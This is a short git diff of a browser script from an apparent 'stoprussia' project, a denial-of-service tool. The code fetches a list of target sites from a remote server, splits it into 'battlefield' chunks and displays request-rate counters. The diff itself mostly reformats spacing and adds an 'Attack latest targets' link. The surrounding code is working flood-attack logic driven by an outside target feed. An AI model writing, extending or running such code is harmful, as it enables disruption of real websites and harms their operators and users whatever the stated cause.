@@ -2,13 +2,17 @@ document.addEventListener('DOMContentLoaded', () => {
   if (!('serviceWorker' in navigator)) { alert('Browser is unsupported!'); window.close() }
 
   const githubLink = document.createElement('a')
-  githubLink.href='https://github.com/0x77dev/stoprussia#stoprussia'
-  githubLink.innerText='GitHub repository and more info'
+  githubLink.href = 'https://github.com/0x77dev/stoprussia#stoprussia'
+  githubLink.innerText = 'GitHub repository and more info'
   document.body.append(githubLink)
-  const latestLink = document.createElement('a')
-  latestLink.href='/#4'
-  latestLink.innerText='Attack latest links'
-  document.body.append(githubLink)
+  
+  if (location.hash !== '#4') {
+    const latestLink = document.createElement('a')
+    latestLink.href = '/#4'
+    latestLink.innerText = 'Attack latest targets'
+    document.body.append(latestLink)
+  }
+
   const statusEl = document.createElement('pre')
   document.body.append(statusEl)
   const metricsEl = document.createElement('pre')
@@ -27,7 +31,7 @@ document.addEventListener('DOMContentLoaded', () => {
     total++
   }
 
-  setInterval(() =>{
+  setInterval(() => {
     metricsEl.innerText = `${count} requests/sec; total ${total} requests`
     count = 0
   }, 1000)
@@ -36,7 +40,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const res = await fetch('https://srl.0x77.dev')
     let { targets, version } = await res.json() as { targets: string[]; version?: number }
 
-    const battlefield = location.hash.length ? parseInt(location.hash.replace('#', ''))-1 : new Date().getSeconds() % 4
+    const battlefield = location.hash.length ? parseInt(location.hash.replace('#', '')) - 1 : new Date().getSeconds() % 4
     targets = [...getChunks(targets, 15)][battlefield]
 
     console.log(version, battlefield, targets)
